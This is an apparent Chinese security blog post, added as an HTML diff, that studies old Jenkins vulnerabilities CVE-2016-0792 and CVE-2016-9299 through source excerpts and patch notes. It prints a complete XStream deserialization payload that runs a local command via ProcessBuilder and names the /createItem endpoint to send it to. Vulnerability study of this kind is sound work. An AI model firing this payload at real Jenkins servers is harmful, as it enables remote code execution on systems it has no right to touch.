@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Jenkins相关漏洞学习（二） - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期三, 十一月 25日 2020, 7:23 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> Jenkins 历史漏洞学习记录，其二。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="CVE-2016-0792"><a href="#CVE-2016-0792" class="headerlink" title="CVE-2016-0792"></a>CVE-2016-0792</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins:1.642.4</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>因为已经分析过 xstream 反序列化漏洞了，所以主要看看触发路径，直接用最近 CVE-2020-26217 的 payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>/tmp/PPPPPPPPPwn<span class="tag">&lt;/<span class="name">string</span>&gt;</span> </span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后根据报错栈观察代码，createItem 的处理代码在 Jenkins 类中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequirePOST</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> TopLevelItem <span class="title function_">doCreateItem</span><span class="params">(StaplerRequest req, StaplerResponse rsp)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.itemGroupMixIn.createTopLevelItem(req, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当传递的 contents-type 为 xml 时，会进入 createProjectFromXML：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">isXmlSubmission</span> <span class="operator">=</span> requestContentType != <span class="literal">null</span> &amp;&amp; (requestContentType.startsWith(<span class="string">&quot;application/xml&quot;</span>) || requestContentType.startsWith(<span class="string">&quot;text/xml&quot;</span>));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (isXmlSubmission) &#123;</span><br><span class="line">    result = <span class="built_in">this</span>.createProjectFromXML(name, req.getInputStream());</span><br><span class="line">    rsp.setStatus(<span class="number">200</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后来到 Items 类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Item <span class="title function_">load</span><span class="params">(ItemGroup parent, File dir)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Item</span> <span class="variable">item</span> <span class="operator">=</span> (Item)getConfigFile(dir).read();</span><br><span class="line">    item.onLoad(parent, dir.getName());</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (LOGGER.isLoggable(Level.FINE)) &#123;</span><br><span class="line">        LOGGER.fine(<span class="string">&quot;Reading &quot;</span> + <span class="built_in">this</span>.file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="built_in">this</span>.file));</span><br><span class="line"></span><br><span class="line">    Object var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = <span class="built_in">this</span>.xs.fromXML(in);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (XStreamException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unable to read &quot;</span> + <span class="built_in">this</span>.file, var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unable to read &quot;</span> + <span class="built_in">this</span>.file, var8);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于这里的 Xstream 类没有做安全配置，导致了漏洞。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>修改 HTTP 头，然后将 xml POST 给 &#x2F;createItem?name&#x3D;test。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>Xsteam 修改了自身的黑名单，Jenkins 则使用了 Xstream 提供的内部安全策略白名单。</p>
+<h3 id="CVE-2016-9299"><a href="#CVE-2016-9299" class="headerlink" title="CVE-2016-9299"></a>CVE-2016-9299</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins:2.19.2</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>还是一个反序列化漏洞，绕过方式类同 CVE-2016-0788，同样使用的是类似 JRMP 的二次反序列化方式，同样是通过 JSON 调用某个类的 getter 函数，这里使用的是 LdapAttribute，它有一个 getAttributeSyntaxDefinition 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> DirContext <span class="title function_">getBaseCtx</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.baseCtx == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.baseCtxEnv == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.baseCtxEnv = <span class="keyword">new</span> <span class="title class_">Hashtable</span>(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.baseCtxEnv.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapCtxFactory&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.baseCtxEnv.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, <span class="built_in">this</span>.baseCtxURL);</span><br><span class="line">        <span class="built_in">this</span>.baseCtx = <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(<span class="built_in">this</span>.baseCtxEnv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.baseCtx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> DirContext <span class="title function_">getAttributeSyntaxDefinition</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">DirContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.getBaseCtx().getSchema(<span class="built_in">this</span>.rdn);</span><br><span class="line">    <span class="type">DirContext</span> <span class="variable">var2</span> <span class="operator">=</span> (DirContext)var1.lookup(<span class="string">&quot;AttributeDefinition/&quot;</span> + <span class="built_in">this</span>.getID());</span><br><span class="line">    <span class="type">Attribute</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getAttributes(<span class="string">&quot;&quot;</span>).get(<span class="string">&quot;SYNTAX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (var3 != <span class="literal">null</span> &amp;&amp; var3.size() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> (String)var3.get();</span><br><span class="line">        <span class="keyword">return</span> (DirContext)var1.lookup(<span class="string">&quot;SyntaxDefinition/&quot;</span> + var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(<span class="built_in">this</span>.getID() + <span class="string">&quot;does not have a syntax associated with it&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显这里可以触发 LDAP 注入，不过该版本 Jenkins 使用的 Java 版本较高，无法通过 Reference 进行 RCE。</p>
+<p>接下来关注 getAttributeSyntaxDefinition 函数中调用的 getSchema 函数，通过调试可以发现，最后会调用 LdapBindingEnumeration 类的 createItem 函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Binding <span class="title function_">createItem</span><span class="params">(String var1, <span class="keyword">final</span> Attributes var2, Vector&lt;Control&gt; var3)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">this</span>.getAtom(var1);</span><br><span class="line">    <span class="keyword">if</span> (var2.get(Obj.JAVA_ATTRIBUTES[<span class="number">2</span>]) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var4 = AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Object&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">                    <span class="keyword">return</span> Obj.decodeObject(var2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="built_in">this</span>.acc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)var11.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里会调用 Obj.decodeObject 对 LDAP 服务端返回的数据进行反序列化，但是需要满足几个条件，似乎涉及到了 LDAP 协议的 asn1 之类的东西，暂时不感兴趣就不看了。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>详见参考文章。</p>
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>jndi 相关的类也被 ban 掉了。</p>
+<h3 id="CVE-2018-1000861"><a href="#CVE-2018-1000861" class="headerlink" title="CVE-2018-1000861"></a>CVE-2018-1000861</h3><p>摸了，以后有兴趣了再回来看。</p>
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/sevck/p/5225629.html">Jenkins-CVE-2016-0792漏洞利用及修复建议</a></p>
+<p><a href="https://paper.seebug.org/199/">Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Jenkins/">Jenkins</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2021/02/19/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%A5%87%E5%A6%99%E6%93%8D%E4%BD%9C/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>php://filter过滤器的奇妙操作</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/11/24/Jenkins%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/">
+                        <span>Jenkins相关漏洞学习（一）</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
